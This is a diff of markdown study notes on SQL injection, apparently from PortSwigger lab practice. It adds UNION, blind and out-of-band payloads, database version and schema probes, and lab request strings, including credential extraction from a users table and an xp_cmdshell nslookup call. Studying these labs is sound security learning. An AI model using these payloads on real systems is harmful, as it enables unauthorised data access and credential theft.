@@ -57,16 +57,30 @@
 
 **In-band: Union-Based Injection**  
 - Determine the number of columns required: `' ORDER BY 1--`  OR `' UNION SELECT NULL,NULL--`
+- Oracle specific syntaxt: `' UNION SELECT NULL FROM DUAL--`
 - Retrieve othe records: `' UNION SELECT 1, username, password FROM users --`
 
 **Blind: Boolean-based Injection**  
-- `'; WAITFOR DELAY '0:0:10' --`
+- `TBC`
 - 
 **Blind: Time-Base Injection**  
 - `'; WAITFOR DELAY '0:0:10' --`
 
 **Out-of-Band (OOB) Injection**  
 - `'; EXEC xp_cmdshell('nslookup yourdomain.com') --`
+
+**Second order/Stored Injection**  
+- `TBC`
+
+**Examine the specific database**  
+- Oracle built-in table: ' UNION SELECT NULL FROM **DUAL**--
+- Oracle DB version: SELECT banner FROM **v$version**
+- Microsoft, MySQL DB version: SELECT **@@version**
+- PostgreSQL DB version: SELECT **version()**
+- MySQL comment: ' OR 1=1 **#**
+- **All DB except Oracle**: SELECT * FROM information_schema.tables, SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+- **Oracle**: SELECT * FROM all_tables, SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 ### Lab
 1. SQL injection vulnerability in WHERE clause allowing **retrieval of hidden data**
@@ -77,22 +91,26 @@
    - modify the body parameter username=`administrator'--`&password=password
 5. SQL injection **UNION** attack, determining the **number of columns** returned by the query
    - GET /filter?category=`' UNION SELECT NULL,NULL,NULL--`
-7. Item 4
-8. Item 5
-9. Item 6
-10. Item 7
-11. Item 8
-12. Item 9
-13. Item 10
-14. Item 11
-15. Item 12
-16. Item 13
-17. Item 14
-18. Item 15
-19. Item 16
-20. Item 17
-21. Item 18
-22. 
+7. SQL injection **UNION** attack, **finding** a **column** containing **text**
+   - GET /filter?category=`' UNION SELECT NULL,'abc',NULL--`
+9. SQL injection **UNION** attack, **retrieving data** from other tables
+    - GET /filter?category=`' UNION SELECT username, password FROM users--`
+11. SQL injection attack, querying the **database type and version on Oracle**
+    - GET /filter?category=`' UNION SELECT BANNER, NULL FROM v$version--`
+13. SQL injection attack, querying the **database type and version on MySQL and Microsoft**
+    - GET /filter?category=`' UNION SELECT @@version,'def'#`
+15. Item 8
+16. Item 9
+17. Item 10
+18. Item 11
+19. Item 12
+20. Item 13
+21. Item 14
+22. Item 15
+23. Item 16
+24. Item 17
+25. Item 18
+26. 
 
 
 
